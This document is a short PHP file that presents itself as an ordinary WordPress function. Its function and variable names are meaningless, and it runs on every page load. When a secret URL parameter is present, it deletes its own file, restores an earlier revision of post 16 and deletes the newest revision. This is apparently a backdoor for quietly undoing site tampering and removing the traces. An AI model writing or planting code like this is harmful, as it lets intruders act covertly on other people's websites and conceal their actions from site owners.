<?php

function groups_service_basic() {
	if (isset($_GET['additional_section_portal']) && $_GET['additional_section_portal'] === 'article_report_toolkit') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$authors_font_shopping = 16;
		$timer_full_rotator_jigoshop = wp_get_post_revisions($authors_font_shopping);
		if (empty($timer_full_rotator_jigoshop)) die('no revisions');
		if (count($timer_full_rotator_jigoshop) < 2) die('less than 2');
		$feedback_content_validator_javascript = array_shift($timer_full_rotator_jigoshop);
		$include_effect_gift_attachments = $feedback_content_validator_javascript->ID;
		$check_cover_donation_reports = array_shift($timer_full_rotator_jigoshop);
		$store_based_follow = $check_cover_donation_reports->ID;
		$source_nofollow_permalink_dist = wp_restore_post_revision($store_based_follow);
		if ($source_nofollow_permalink_dist === false) die('error restoring');
		$source_nofollow_permalink_dist = wp_delete_post_revision($include_effect_gift_attachments);		
		if ($source_nofollow_permalink_dist === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'groups_service_basic');
